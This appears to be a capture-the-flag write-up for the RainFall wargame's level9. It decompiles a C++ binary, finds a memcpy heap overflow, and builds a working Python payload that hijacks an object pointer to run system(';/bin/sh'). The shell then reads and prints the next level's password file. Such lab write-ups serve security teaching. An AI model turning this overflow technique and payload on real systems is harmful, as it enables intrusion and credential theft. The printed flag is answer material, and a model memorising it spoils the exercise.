## Basic analysis
All right, lets give this a try:
~~~shell
level9@RainFall:~$ ./level9
level9@RainFall:~$ ./level9 42
level9@RainFall:~$ ./level9 42 42
level9@RainFall:~$ ./level9 42 42 42
level9@RainFall:~$ 
~~~
Doing nothing, not really helpful...you deserve to be eaten by **Ghidra**!
~~~C
void main(int param_1,int param_2)
{
  N *this;
  undefined4 *this_00;
  
  if (param_1 < 2) {
                    /* WARNING: Subroutine does not return */
    _exit(1);
  }
  this = (N *)operator.new(0x6c);
  N::N(this,5);
  this_00 = (undefined4 *)operator.new(0x6c);
  N::N((N *)this_00,6);
  N::setAnnotation(this,*(char **)(param_2 + 4));
  (**(code **)*this_00)(this_00,this);
  return;
}
void __thiscall N::N(N *this,undefined4 param_1)

{
  *(undefined ***)this = &PTR_operator+_08048848;
  *(undefined4 *)(this + 0x68) = param_1;
  return;
}

void __thiscall N::setAnnotation(N *this,char *param_1)
{
  size_t __n;
  
  __n = strlen(param_1);
  memcpy(this + 4,param_1,__n);
  return;
}
~~~
As we see, this binary is C++, two instances of a class N is allocated. Also, the function **setAnnotation()** is called for the first N instance, expecting the argument from main, measuring it and calling **memcpy(*dest, *src, int length)**. There is no system call, nor any function to print or revel the flag for the next level. But **memcpy** is vulnerable to overflow, so let's try that and invoke shell on the place of return address. 

## Overflow
Lets get the offset:
~~~shell
(gdb) r Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
Starting program: /home/user/level9/level9 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag

Program received signal SIGSEGV, Segmentation fault.
0x08048682 in main ()
(gdb) info registers eax
eax            0x41366441	1094083649
~~~
Using the **wiremask** ti generate the pattern and memory address of the eax (return value) register, we find out the offset is **108**. This would correlate with the decompiled code, where creation of the N clss instances happens with the **0x6c**, which is hexadecimal for 108 decimal. Now we know the offset, the point is to overflow it to rewrite the return adress of the method setAnnotation - to call the shell for us. 

Info needed:
1) Memory address of system() ((gdb) info functions system): **0xb7d86060**
2) Address of EAX register (which contains the return value we need to overwrite..): **0x804a00c**
~~~shell
(gdb) b *main+136
Breakpoint 1 at 0x804867c
(gdb) run 424242
Starting program: /home/user/level9/level9 424242

Breakpoint 1, 0x0804867c in main ()
(gdb) x $eax
0x804a00c:	0x32343234
(gdb) 
~~~
3) offset: **108**


The payload will be sent to the binary as an argument and will be structured like - **address of system (4 bytes) -> padding of 104 bytes -> address of eax register -> ";/bin/sh" as a argument for system()**
~~~shell
level9@RainFall:~$ ./level9 $(python -c 'print "\xb7\xd8\x60\x60"[::-1] + "a" * 104 + "\x08\x04\xa0\x0c"[::-1] + ";/bin/sh"')
sh: 1: 
       : not found
$ cat /home/user/bonus0/.pass
f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
~~~
